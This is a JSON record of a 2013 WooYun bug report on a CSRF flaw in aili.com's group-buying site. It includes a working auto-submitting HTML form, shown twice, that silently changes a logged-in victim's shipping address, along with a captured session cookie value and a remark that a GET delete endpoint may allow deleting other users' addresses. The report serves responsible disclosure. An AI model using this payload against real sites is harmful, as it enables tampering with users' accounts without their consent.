{"id": 61033, "wybug_id": "wooyun-2013-040979", "wybug_title": "爱丽网团购某处csrf漏洞", "wybug_corp": "aili.com", "wybug_author": "小龙", "wybug_date": "2013-10-25 17:27", "wybug_open_date": "2013-12-09 17:27", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-10-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-11-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-09：\t细节向公众公开  简要描述： (*^__^*) 嘻嘻…… 详细说明：  poc：\n<html><body><form id=\"aili\" name=\"aili\" action=\"http://tuan.aili.com/account/setaddress.php\" method=\"POST\"><input type=\"hidden\" name=\"referer\" value=\"http%3A%2F%2Ftuan.aili.com%2Fquanguo\" /><input type=\"hidden\" name=\"PHPSESSID\" value=\"dvfefcagm1c8ddsbaphg2afd15\" /><input type=\"hidden\" name=\"CNZZDATA30045075\" value=\"cnzz_eid%3D1993539694-1382675236-http%253A%252F%252Ftuan.aili.com%26ntime%3D1382675236%26cnzz_a%3D6%26sin%3Dnone%26ltime%3D1382675406196\" /><input type=\"hidden\" name=\"_cnzz_CV=; referer\" value=\"http%3A%2F%2Ftuan.aili.com%2Faccount%2Fsignup.php\" /><input type=\"hidden\" name=\"province\" value=\"123\" /><input type=\"hidden\" name=\"area\" value=\"123\" /><input type=\"hidden\" name=\"city\" value=\"123\" /><input type=\"hidden\" name=\"street\" value=\"hacksb\" /><input type=\"hidden\" name=\"zipcode\" value=\"123456\" /><input type=\"hidden\" name=\"name\" value=\"hacksb123\" /><input type=\"hidden\" name=\"mobile\" value=\"13800138000\" /><input type=\"submit\" value=\"submit\" /></form><script>   document.aili.submit(); </script></body></html>\n自己去测试吧。。另外还有\n\n设置默认地址，删除等等功能都不能用，而且删除那是get请求，应该可以越权删除他人收货地址如果可以的话那就是2万4欠个收货地址可以遍历了。。。- -   漏洞证明：  poc：\n<html><body><form id=\"aili\" name=\"aili\" action=\"http://tuan.aili.com/account/setaddress.php\" method=\"POST\"><input type=\"hidden\" name=\"referer\" value=\"http%3A%2F%2Ftuan.aili.com%2Fquanguo\" /><input type=\"hidden\" name=\"PHPSESSID\" value=\"dvfefcagm1c8ddsbaphg2afd15\" /><input type=\"hidden\" name=\"CNZZDATA30045075\" value=\"cnzz_eid%3D1993539694-1382675236-http%253A%252F%252Ftuan.aili.com%26ntime%3D1382675236%26cnzz_a%3D6%26sin%3Dnone%26ltime%3D1382675406196\" /><input type=\"hidden\" name=\"_cnzz_CV=; referer\" value=\"http%3A%2F%2Ftuan.aili.com%2Faccount%2Fsignup.php\" /><input type=\"hidden\" name=\"province\" value=\"123\" /><input type=\"hidden\" name=\"area\" value=\"123\" /><input type=\"hidden\" name=\"city\" value=\"123\" /><input type=\"hidden\" name=\"street\" value=\"hacksb\" /><input type=\"hidden\" name=\"zipcode\" value=\"123456\" /><input type=\"hidden\" name=\"name\" value=\"hacksb123\" /><input type=\"hidden\" name=\"mobile\" value=\"13800138000\" /><input type=\"submit\" value=\"submit\" /></form><script>   document.aili.submit(); </script></body></html>\n自己去测试吧。。另外还有\n\n设置默认地址，删除等等功能都不能用，而且删除那是get请求，应该可以越权删除他人收货地址如果可以的话那就是2万4欠个收货地址可以遍历了。。。- -   修复方案：  token   版权声明：转载请注明来源 小龙@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2013-10-25 17:35 厂商回复： @小龙  白帽子辛苦啦.  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-10-25 22:03 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  确认 处理，你获得了 4 rank 小厂商的节奏。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}